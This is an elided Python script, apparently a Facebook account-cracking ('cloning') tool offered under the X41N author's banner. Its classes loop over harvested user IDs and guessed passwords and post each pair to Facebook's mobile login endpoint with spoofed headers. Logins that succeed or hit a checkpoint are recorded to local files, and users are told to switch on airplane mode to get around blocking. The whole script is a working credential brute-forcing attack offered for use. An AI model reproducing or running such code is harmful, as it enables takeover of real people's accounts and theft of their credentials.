...
from random import randint
r1=requests.get("https://github.com/AyeshaX41N/File1/blob/main/ApprovemXD.txt").text
...
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim),'x-fb-connection-quX41Nty': 'EXCELLENT', 'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.3','x-fb-connection-type': 'unknown','content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}

def main():
	os.system('clear');print(banner)
	print('\033[1;32m        ┌─────────────────────────────────┐') 
	print("\033[1;92m\t│\033[1;92mWELLCOME TO X41N & YEAMIN 2.8     \033[1;92m      │")
	print('\033[1;32m┌────────────────────────────────────────────┐') 
	...
	print('\033[1;92m│\033[1;37m[03] \033[1;92mOWNER X41N & YEAMIN \033[1;32m                    │')
	...
	if Adi in ('3', '03'):
		os.system("xdg-open https://youtube.com/@X41N")
	if Adi in ('0', '00'):
		exit('THANKS FOR USING X41N TOOL')  
	else:
		print ('      InvX41Nd Select')
		main()
def banner():
	print(banner)
def hasil(ok,cp):
...
class __crack__:
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write(f"\r \x1b[1;97m[\033[1;36mX41N\033[1;37m] {loop}/{len(self.id)} \033[1;37m[\033[1;36mTOTAL-Idz\033[1;37m] \033[1;37m[\033[1;36m{len(ok)}\033[1;37m]")
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			po = ses.post("https://mbasic.facebook.com/login/device-based/vX41Ndate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;37m[\033[1;32mX41N-OK\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
	...
	def __pler__(self):
		...
		if yan == '':
			...
			print('\033[1;37m[+]\033[1;33m File CLONING CP/OK IDS MIX ')
			print('\033[1;37m[+]\033[1;36m TOTAL IDS \033[1;91m: \033[1;32m%s ' % len(self.id))
			print('\033[1;37m[+]\033[1;36mX41N PROCESS HAS BEEN STARTED')
			print(50*"\033[1;97m_")
			print('      \033[1;97m\033[1;41m [ IF  NO RESULT USE AIRPLANE MODE ] \033[0m\033[1;93m')
			print(50*"\033[1;97m_")
...
class __filecrack3__:
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write(f"\r \x1b[1;97m[\033[1;36mX41N\033[1;37m] {loop}/{len(self.id)} \033[1;37m[\033[1;32mOK-{len(ok)}\033[1;37m] ")
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if 'c_user' in ses.cookies.get_dict():
				...
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('X41N_Ok.txt','a').write('%s\n' % wrt)
				break
			elif 'checkpoint' in ses.cookies.get_dict():
				print('\r\033[1;37m[\033[1;31mX41N-CP\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('cp.txt','a').write('%s\n' % wrt)
				break
...
|__/  |__/|__/  |__/    |__/                                                                                                                                         
=================================================
    [-] AUTHOR    :\033[1;32m X41N H4K3R ( YEAMIN )
    [-] GITHUB    :\033[1;32m ASHRAFUL-RAIN17
    [-] WhatsApp  :\033[1;32m +8801756459181
...
def xoshnaw():
	...
	try:
		httpCaht = requests.get("https://www.youtube.com/@X41N").text
		if id in httpCaht:
